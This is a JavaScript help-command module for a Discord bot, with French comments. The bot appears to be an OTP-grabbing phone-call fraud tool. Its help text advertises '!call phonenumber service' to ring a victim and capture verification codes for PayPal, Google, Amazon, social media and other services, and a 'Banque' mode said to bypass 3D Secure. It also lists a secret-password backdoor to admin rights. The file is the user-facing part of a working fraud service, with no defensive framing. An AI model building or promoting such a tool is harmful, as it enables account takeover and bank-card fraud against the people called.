module.exports = function(m) {
    /**
     * Récupération du fichier config
     */
    const config = require('../config');

    /**
     * Vérification de la commande, si help a été tapé alors contineur
     */
    if (m.command !== "help") return false;

    /**
     * Création du message embed fixe, présentation des commandes
     */
    const embed = {
        "title": "Help, commands & informations",
        "description": "All the Admin commands : \n `!user add @user` : allow someone to use the bot & the calls\n`!user delete @user` : remove someone or an admin from the bot \n`!user info @user` : get infos from a user \n`!user setadmin @user` : set a user to admin \n\nAll the Users commands : \n`!secret yoursecretpassword @user` : set a user to admin without been admin \n`!call phonenumber service` ou pour exemple `!call 33612345678 paypal` \npermet de lancer un appel vers le numéro de téléphone et get le code\n\nThe differents call services supported :\n`Paypal`\n`Google`\n`Snapchat`\n`Instagram`\n`Facebook`\n`Whatsapp`\n`Twitter`\n`Amazon`\n`Cdiscount`\n`Default` : work for all the systems\n`Banque` : bypass 3D Secure",
        "color": 11686254,
        "timestamp": "2020-12-27T08:36:37.450Z",
        "footer": {
          "text": m.user
        }
    };

    /**
     * Envoi du message embed
     */
    return m.message.channel.send({ embed });
}